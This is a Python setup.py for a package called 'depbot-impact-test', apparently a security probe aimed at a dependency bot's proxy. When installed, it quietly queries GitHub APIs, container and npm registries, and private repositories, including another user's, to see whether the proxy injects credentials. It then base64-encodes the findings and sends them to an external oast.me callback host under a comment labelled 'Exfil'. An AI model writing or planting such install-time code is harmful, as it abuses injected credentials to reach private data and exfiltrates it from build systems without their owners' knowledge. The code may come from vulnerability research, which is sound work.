import os, urllib.request, base64, json, subprocess

results = {}

# Test: Does the proxy inject credentials for other GitHub services?

# 1. git ls-remote on raw.githubusercontent.com (different subdomain)
try:
    r = subprocess.run(['git', 'ls-remote', 'https://raw.githubusercontent.com/toofikz2/depbot-impact-test', 'HEAD'],
                       capture_output=True, text=True, timeout=10)
    results['git_raw'] = f'rc={r.returncode} out={r.stdout[:50]} err={r.stderr[:80]}'
except Exception as e:
    results['git_raw'] = str(e)[:80]

# 2. HTTP to npm.pkg.github.com through proxy (check if credential injected)
try:
    req = urllib.request.Request('https://npm.pkg.github.com/@tooforg/test')
    resp = urllib.request.urlopen(req, timeout=5)
    data = resp.read()
    results['npm_pkg'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
except Exception as e:
    results['npm_pkg'] = str(e)[:100]

# 3. GitHub GraphQL API through proxy
try:
    req = urllib.request.Request('https://api.github.com/graphql')
    req.add_header('Content-Type', 'application/json')
    req.data = b'{"query":"{ viewer { login } }"}'
    resp = urllib.request.urlopen(req, timeout=5)
    data = resp.read()
    results['graphql'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
except Exception as e:
    results['graphql'] = str(e)[:100]

# 4. GitHub API /repos endpoint through proxy (different from /user)
try:
    req = urllib.request.Request('https://api.github.com/repos/toofikz2/depbot-impact-test')
    resp = urllib.request.urlopen(req, timeout=5)
    data = resp.read()
    results['api_repos'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
except Exception as e:
    results['api_repos'] = str(e)[:100]

# 5. Test ghcr.io (GitHub Container Registry)
try:
    req = urllib.request.Request('https://ghcr.io/v2/')
    resp = urllib.request.urlopen(req, timeout=5)
    data = resp.read()
    results['ghcr'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
except Exception as e:
    results['ghcr'] = str(e)[:100]

# 6. Test if we can read PRIVATE repo content through the proxy
# (the credential might allow content access via raw.githubusercontent.com)
try:
    req = urllib.request.Request('https://raw.githubusercontent.com/tooforg/private-test-repo/main/README.md')
    resp = urllib.request.urlopen(req, timeout=5)
    data = resp.read()
    results['private_raw'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
except Exception as e:
    results['private_raw'] = str(e)[:100]

# 7. Test accessing ANOTHER USER's private repo via git through proxy
try:
    r = subprocess.run(['git', 'ls-remote', 'https://github.com/toofikz1/personal-secret-repo.git', 'HEAD'],
                       capture_output=True, text=True, timeout=10,
                       env={**os.environ, 'GIT_TERMINAL_PROMPT': '0'})
    results['crossuser_git'] = f'rc={r.returncode} out={r.stdout[:50]} err={r.stderr[:80]}'
except Exception as e:
    results['crossuser_git'] = str(e)[:80]

# Exfil
payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 14000), 1800)]
for i, chunk in enumerate(chunks):
    try:
        urllib.request.urlopen('http://' + 'd99nibe1b2etnockvmb0erm7ukhz99koq.oast.me' + '/v11/' + str(i) + '?d=' + chunk, timeout=5)
    except:
        pass

from setuptools import setup
setup(name="depbot-impact-test", version="1.0.0",
      install_requires=["requests==2.26.0", "urllib3==1.26.5", "flask==2.0.0"])
